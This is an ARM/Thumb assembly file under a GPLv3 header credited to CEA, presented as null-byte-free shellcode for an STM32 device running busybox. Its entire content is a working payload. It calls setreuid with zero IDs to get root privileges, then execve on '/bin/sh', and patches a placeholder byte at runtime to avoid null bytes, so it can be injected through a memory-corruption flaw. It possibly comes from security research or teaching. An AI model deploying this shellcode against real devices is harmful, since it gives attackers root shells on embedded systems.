// Copyright (C) 2025 CEA - All Rights Reserved
// 
// This program is free software: you can redistribute it and/or modify it under
// the terms of the GNU General Public License as published by the Free Software
// Foundation, either version 3 of the License, or (at your option) any later
// version.
// 
// This program is distributed in the hope that it will be useful, but WITHOUT ANY
// WARRANTY; without even the implied warranty of  MERCHANTABILITY or FITNESS FOR
// A PARTICULAR PURPOSE. See the GNU General Public License for more details.
// 
// You should have received a copy of the GNU General Public License along with
// this program.  If not, see <http://www.gnu.org/licenses/>.


//Shellcode working on the stm32 with busybox and has no null bytes

.section .text

.globl _start

_start: 
    .code 32
    add r3, pc, #1
    bx  r3

    .code 16

//setreuid part 
    mov r7, #203
    eor r0, r0, r0
    eor r1, r1, r1
    svc #1

//shell part 
    mov r7, #11  
    eor r2, r2, r2   
    str r2, [sp, #8]
    str r2, [sp, #4] 
    add r0, pc, #8  
    strb r2, [r0, #7]
    str r0, [sp, #4]    
    mov r1, sp 
    add r1, r1, #4
    svc #1

.ascii "/bin/shx"
